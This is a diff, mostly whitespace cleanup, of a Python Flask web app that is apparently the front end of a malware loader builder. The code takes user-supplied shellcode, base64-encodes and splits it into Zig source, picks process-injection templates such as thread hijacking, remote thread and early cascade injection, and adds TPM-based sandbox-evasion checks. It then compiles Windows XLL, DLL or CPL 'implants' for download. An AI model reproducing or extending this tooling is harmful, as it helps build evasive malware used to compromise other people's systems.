@@ -2,19 +2,19 @@ from flask import Flask, render_template, request, send_file, jsonify, after_thi
 import base64
 import subprocess
 import os
-import re 
+import re
 import math
 import hashlib
 import uuid
 import time
 from datetime import datetime
 
-app = Flask(__name__, 
+app = Flask(__name__,
     static_url_path='/static',
     static_folder='static')
-app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # this will resolve the issue with docker env to handle large POST requests. 
+app.config['MAX_CONTENT_LENGTH'] = 32 * 1024 * 1024  # this will resolve the issue with docker env to handle large POST requests.
 app.config['IMPLANTS_DIR'] = 'implants'  # Directory to store implants
-app.config['MAX_FORM_MEMORY_SIZE'] = 32 * 1024 * 1024   # this will resolve the issue with docker env to handle large POST requests. 
+app.config['MAX_FORM_MEMORY_SIZE'] = 32 * 1024 * 1024   # this will resolve the issue with docker env to handle large POST requests.
 app.config['SHELLCODE_PARTS_DIR'] = '../src/shellcode_parts'  # Directory to store shellcode parts
 
 # Ensure implants directory exists
@@ -37,7 +37,7 @@ def log_request_info():
         if 'content' in request.form:
             print(f"Content size in form: {len(request.form['content']) / 1024:.2f} KB")
 
-@app.errorhandler(413) # have added this to log this error, it is probably related to the docker env. 
+@app.errorhandler(413) # have added this to log this error, it is probably related to the docker env.
 def request_entity_too_large(error):
     print(f"413 Error - Content Length: {request.content_length / 1024:.2f} KB")
     return jsonify({
@@ -71,10 +71,10 @@ def split_base64_string(encoded_content, num_parts=15):
     total_length = len(encoded_content)
     # Calculate base chunk size, rounding up to ensure we don't lose data
     base_chunk_size = (total_length + num_parts - 1) // num_parts
-    
+
     parts = []
     current_pos = 0
-    
+
     while current_pos < total_length and len(parts) < num_parts:
         # For the last part, take all remaining content
         if len(parts) == num_parts - 1:
@@ -83,11 +83,11 @@ def split_base64_string(encoded_content, num_parts=15):
             chunk = encoded_content[current_pos:current_pos + base_chunk_size]
         parts.append(chunk)
         current_pos += len(chunk)
-    
+
     # Pad with empty strings if needed
     while len(parts) < num_parts:
         parts.append("")
-    
+
     return parts
 
 def get_specific_code_block(file_path, block_identifier):
@@ -98,13 +98,13 @@ def get_specific_code_block(file_path, block_identifier):
     try:
         with open(file_path, 'r') as file:
             content = file.read()
-           
+
             pattern = rf"// {block_identifier}\s*(.*?)\s*// END OF {block_identifier}"
             match = re.search(pattern, content, re.DOTALL | re.IGNORECASE)
-            
+
             if match:
                 extracted_block = match.group(1).strip()
-            
+
                 return extracted_block
             else:
                 print(f"Warning: Block identifier '{block_identifier}' not found in {file_path}")
@@ -118,37 +118,37 @@ def index():
     if request.method == 'POST':
         # Initialize this variable outside the try block
         original_zig_code = ""
-        
+
         try:
             # First read the original code before doing anything else
             with open('../src/main.zig', 'r') as f:
                 original_zig_code = f.read()
-                
+
             # Use .get() method to provide default values when fields are missing
             content = request.form['content']  # This is likely required
             extension = request.form['extension']  # This is likely required
             injection_method = request.form['injection_method']  # This is likely required
-            
+
             # For optional checkboxes, use .get() with a default value
             enable_protection = request.form.get('protection_features', 'none')
             enable_additional_options = request.form.get('enable_additional_options', 'none')
             process_name = request.form.get('process_name', '')
             numbr_parts = int(request.form.get('num_shellcode_parts', '15'))
 
-            
+
             xll_code = '';
             dll_code = '';
             cpl_code = '';
 
             cpl_wrapper = get_specific_code_block('../App/parts/ENTRY_CPL', 'CPL WRAPPER')
-            
+
             try:
-               
+
                 encoded_content = base64.b64encode(content.encode()).decode()
                 encoded_size = len(encoded_content)
                 print(f"Encoded content size: {encoded_size}")
                 shellcode_parts = split_base64_string(encoded_content, num_parts=numbr_parts)
-                
+
                 # Clean up old shellcode part files
                 cleanup_shellcode_parts()
 
@@ -162,7 +162,7 @@ def index():
 
                 with open('../src/main.zig', 'r') as t:
                     zig_code = t.read()
-                
+
                 struct_content = "//START HERE\n"
                 struct_content += "const SH = struct {\n"
 
@@ -176,7 +176,7 @@ def index():
                     else:
                         struct_content += f'    const b{i}: []const u16 = &[_]u16{{}};\n'
 
-                
+
                 struct_content += f"\n    pub fn getshellcodeparts() [{numbr_parts}][]const u16 {{\n"
                 struct_content += "        return .{\n"
                 for i in range(1, numbr_parts + 1, 5):  # Group by 5 for readability
@@ -189,15 +189,15 @@ def index():
                 struct_content += "    }\n"
                 struct_content += "};\n"
                 struct_content += "//END HERE\n"
-                
-                
+
+
                 zig_code = re.sub(
                     r'//START HERE[\s\S]*?//END HERE',
                     struct_content,
                     zig_code
                 )
-                
-                
+
+
                 if injection_method == 'hijack_thread' and extension == 'xll':
                     xll_code = get_specific_code_block('../App/parts/ENTRY_XLL', 'HIJACK THREAD INJECTION')
                 elif injection_method == 'local_mapping' and extension == 'xll':  # local_mapping
@@ -234,7 +234,7 @@ def index():
                     cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'REMOTE THREAD INJECTION')
                 elif injection_method == 'early_cascade' and extension == 'cpl':
                     cpl_code = get_specific_code_block('../App/parts/ENTRY_CPL', 'EARLY CASCADE INJECTION')
-                
+
                 if cpl_code != '':
                     zig_code = zig_code.replace('// ENTRY_CPL', cpl_code)
                     zig_code = zig_code.replace('// CPL_WRAPPER', cpl_wrapper) # this will add the cpl wrapper to the code
@@ -242,7 +242,7 @@ def index():
                     zig_code = zig_code.replace('// ENTRY_DLL', dll_code)
                 if xll_code != '':
                     zig_code = zig_code.replace('// ENTRY_XLL', xll_code)
-                
+
                 if enable_protection == 'tpm_check':
                     zig_code = zig_code.replace('// Sandbox protection option enabled?', 'if (!core.checkTPMPresence()) {\n            std.debug.print("sandbox detected \\n", .{});\n    return 0;\n}')
 
@@ -256,21 +256,21 @@ def index():
                 # Write the modified code back to main.zig
                 with open('../src/main.zig', 'w') as f:
                     f.write(zig_code)
-                
+
                 with open('../src/temp.txt', 'w') as f:
                     f.write(zig_code)
-                
-                
+
+
                 result = subprocess.run(['zig', 'build', '-Dtarget=x86_64-windows-gnu'], capture_output=True, text=True)
-                
+
             finally:
-                # this will fix the issue when same time same file is being compiled.  
+                # this will fix the issue when same time same file is being compiled.
                 with open('../src/main.zig', 'w') as f:
                     f.write(original_zig_code)
                 print("Restored original Zig code")
-            
-            
-            
+
+
+
             if extension == 'xll':
                 os.rename('../zig-out/bin/ZS.dll', '../zig-out/bin/output.xll' )
             elif extension == 'dll':
@@ -278,7 +278,7 @@ def index():
             elif extension == 'cpl':
                 os.rename('../zig-out/bin/ZS.dll', '../zig-out/bin/output.cpl')
 
-            
+
             output_dir = '../zig-out/bin'
             print(f"Checking output directory: {output_dir}")
 
@@ -294,23 +294,23 @@ def index():
             if compiled_file:
                 output_path = os.path.join(output_dir, compiled_file)
                 print(f"Found compiled file: {output_path}")
-                
+
                 # Generate a unique ID for this implant
                 implant_id = str(uuid.uuid4())
-                
+
                 # Copy the file to the implants directory
                 implant_filename = f"{implant_id}.{extension}"
                 implant_path = os.path.join(app.config['IMPLANTS_DIR'], implant_filename)
-                
+
                 with open(output_path, 'rb') as src, open(implant_path, 'wb') as dst:
                     dst.write(src.read())
-                
+
                 # Calculate MD5 checksum
                 md5_hash = calculate_md5(implant_path)
-                
+
                 # Get file size
                 file_size = os.path.getsize(implant_path)
-                
+
                 # Add to implants registry
                 implants_registry[implant_id] = {
                     'id': implant_id,
@@ -325,7 +325,7 @@ def index():
                     'runtime_protection': enable_additional_options == 'runtime_protection',
                     'process_target': process_name if process_name else 'None'
                 }
-                
+
                 # Cleanup original compiled file
                 try:
                     if os.path.exists(output_path):
@@ -333,25 +333,25 @@ def index():
                         print(f"Deleted original compiled file: {output_path}")
                 except Exception as e:
                     print(f"Error during cleanup: {str(e)}")
-                
-                
+
+
                 cleanup_shellcode_parts() #clean up the shellcode parts
                 return redirect(url_for('implants_page'))
-                
+
             else:
                 print(f"No file found with extension: {extension}")
                 return jsonify({'error': 'Compilation succeeded but file not found'}), 500
         except Exception as e:
-            
+
             try:
                 with open('../src/main.zig', 'w') as f:
                     f.write(original_zig_code)
                 print("Restored original Zig code after error")
             except Exception as restore_error:
                 print(f"Error restoring original code: {str(restore_error)}")
-            
+
             return jsonify({'error': str(e)}), 500
-    
+
     return render_template('index.html')
 
 @app.route('/implants')
@@ -375,17 +375,17 @@ def download_implant(implant_id):
 def delete_implant(implant_id):
     if implant_id in implants_registry:
         implant = implants_registry[implant_id]
-        
+
         # Delete the file
         try:
             if os.path.exists(implant['path']):
                 os.remove(implant['path'])
         except Exception as e:
             print(f"Error deleting file: {str(e)}")
-        
+
         # Remove from registry
         del implants_registry[implant_id]
-        
+
         return redirect(url_for('implants_page'))
     else:
         return jsonify({'error': 'Implant not found'}), 404
@@ -407,5 +407,5 @@ def cleanup_shellcode_parts():
                 print(f"Error removing old shellcode part {file}: {str(e)}")
 
 if __name__ == '__main__':
-    
+
     app.run(debug=True,host='0.0.0.0',port=5002)
